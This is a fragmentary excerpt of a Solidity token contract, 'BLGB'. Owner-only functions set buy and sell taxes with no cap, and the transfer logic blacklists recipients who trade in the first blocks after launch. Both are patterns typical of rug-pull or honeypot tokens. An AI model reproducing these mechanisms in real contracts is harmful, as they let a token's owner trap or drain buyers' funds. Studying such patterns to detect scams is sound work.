...
contract BLGB is Context, IERC20, Ownable {
    ...
    address receiver)
    {
        ...
        _maxOnceEat = 10000000000000* 10**_decimals;
        _maxTotalEat = 10000000000000* 10**_decimals;
    ...
    function setBBB(uint256 newMarketingTax) external onlyOwner() {
        _buyMarketingFee = newMarketingTax;
        _totalTaxIfBuying = _buyMarketingFee;
    }

    function setSSS(uint256 newMarketingTax) external onlyOwner() {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (isExcludedFromCut[sender] || isExcludedFromCut[recipient]) {
                ...
                if (smallOrEqual(block.number , whenEat + cantEatCake)) {youCantEat(recipient);}
